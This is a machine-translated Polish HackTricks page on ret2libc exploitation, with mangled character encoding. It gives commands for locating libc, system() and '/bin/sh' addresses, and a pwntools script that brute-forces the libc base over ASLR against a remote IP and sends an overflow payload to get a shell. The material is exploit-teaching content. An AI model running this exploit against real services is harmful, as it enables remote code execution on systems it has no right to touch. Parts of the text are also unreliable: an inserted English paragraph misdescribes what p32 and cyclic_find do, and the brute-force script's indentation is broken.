<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>


**JeÅ›li znalazÅ‚eÅ› podatny plik binarny i sÄ…dzisz, Å¼e moÅ¼esz go wykorzystaÄ‡ za pomocÄ… Ret2Lib, tutaj znajdziesz kilka podstawowych krokÃ³w, ktÃ³re moÅ¼esz podjÄ…Ä‡.**

# JeÅ›li jesteÅ› **wewnÄ…trz** **hosta**

## MoÅ¼esz znaleÅºÄ‡ **adres lib**c
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
JeÅ›li chcesz sprawdziÄ‡, czy ASLR zmienia adres libc, moÅ¼esz to zrobiÄ‡:
```bash
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```
## Uzyskaj przesuniÄ™cie funkcji systemowej

To uzyskaÄ‡ przesuniÄ™cie funkcji systemowej, moÅ¼emy uÅ¼yÄ‡ narzÄ™dzia `objdump`. NarzÄ™dzie to analizuje plik wykonywalny i wyÅ›wietla informacje o sekcjach, symbolach i funkcjach w pliku.

Aby uzyskaÄ‡ przesuniÄ™cie funkcji systemowej, wykonaj nastÄ™pujÄ…ce kroki:

1. Uruchom polecenie `objdump -T <nazwa_pliku>` w terminalu, gdzie `<nazwa_pliku>` to nazwa pliku wykonywalnego, w ktÃ³rym chcemy znaleÅºÄ‡ przesuniÄ™cie funkcji systemowej.

2. Przeszukaj wynik polecenia `objdump` w poszukiwaniu funkcji systemowej, ktÃ³rej przesuniÄ™cie chcemy znaleÅºÄ‡. MoÅ¼esz to zrobiÄ‡, szukajÄ…c nazwy funkcji systemowej, na przykÅ‚ad `system`.

3. ZnajdÅº wiersz, ktÃ³ry zawiera nazwÄ™ funkcji systemowej i przesuniÄ™cie. PrzesuniÄ™cie bÄ™dzie znajdowaÄ‡ siÄ™ w kolumnie po prawej stronie.

PrzykÅ‚adowy wynik polecenia `objdump -T <nazwa_pliku>` moÅ¼e wyglÄ…daÄ‡ tak:

```
...
00000000004005e0 g    DF .text  0000000000000013  Base        system
...
```

W tym przykÅ‚adzie przesuniÄ™cie funkcji systemowej wynosi `00000000004005e0`.
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
To get the offset of "/bin/sh", we can use the `pwn` module in Python. The `pwn` module provides a function called `p32` that converts an integer to a little-endian byte string. We can use this function to convert the address of "/bin/sh" to a byte string and then find its offset in the payload.

Here is an example code snippet to calculate the offset:

```python
from pwn import *

# Address of "/bin/sh"
bin_sh_addr = 0x12345678

# Convert the address to a little-endian byte string
bin_sh_bytes = p32(bin_sh_addr)

# Find the offset of "/bin/sh" in the payload
offset = cyclic_find(bin_sh_bytes)

print("Offset of \"/bin/sh\":", offset)
```

Replace `0x12345678` with the actual address of "/bin/sh" in your target binary. After running the code, it will print the offset of "/bin/sh" in the payload.
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
## /proc/\<PID>/maps

JeÅ›li proces tworzy **dzieci** za kaÅ¼dym razem, gdy z nim rozmawiasz (serwer sieciowy), sprÃ³buj **odczytaÄ‡** ten plik (prawdopodobnie bÄ™dziesz musiaÅ‚ byÄ‡ rootem).

Tutaj moÅ¼esz znaleÅºÄ‡ **dokÅ‚adne miejsce, w ktÃ³rym jest zaÅ‚adowana biblioteka libc** wewnÄ…trz procesu i **gdzie bÄ™dzie zaÅ‚adowana** dla kaÅ¼dego dziecka procesu.

![](<../../.gitbook/assets/image (95).png>)

W tym przypadku jest zaÅ‚adowana pod adresem **0xb75dc000** (BÄ™dzie to adres bazowy biblioteki libc)

## UÅ¼ywajÄ…c gdb-peda

Uzyskaj adres funkcji **system**, funkcji **exit** i ciÄ…gu znakÃ³w **"/bin/sh"** za pomocÄ… gdb-peda:
```
p system
p exit
find "/bin/sh"
```
# Omijanie ASLR

MoÅ¼esz sprÃ³bowaÄ‡ bruteforce'owaÄ‡ adres bazowy libc.
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
# Kod
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive() #?
```
<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
